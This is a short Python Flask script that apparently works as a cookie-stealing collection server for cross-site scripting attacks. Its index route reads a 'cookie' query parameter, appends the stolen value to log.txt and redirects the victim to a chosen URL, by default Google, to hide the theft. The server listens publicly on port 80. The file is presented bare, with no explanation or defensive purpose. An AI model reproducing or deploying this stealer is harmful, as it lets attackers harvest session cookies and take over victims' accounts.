from flask import Flask
from flask import request
from flask import redirect
import argparse
import sys

app = Flask(__name__, static_folder='static')

@app.route('/')
def index():
    cookie = request.args.get('cookie')
    with open('log.txt', 'a') as log:
        log.write('Cookie: ' + str(cookie) + '\n\n')

    return redirect(new_path, code=302)

if __name__ == '__main__':
        parser = argparse.ArgumentParser()
        parser.add_argument("--url", help = "Url to listen for", type=str)
        args = parser.parse_args()
        if args.url:
            new_path = args.url
        else:
            new_path = "https://google.com"

        app.run(host='0.0.0.0', port=80)
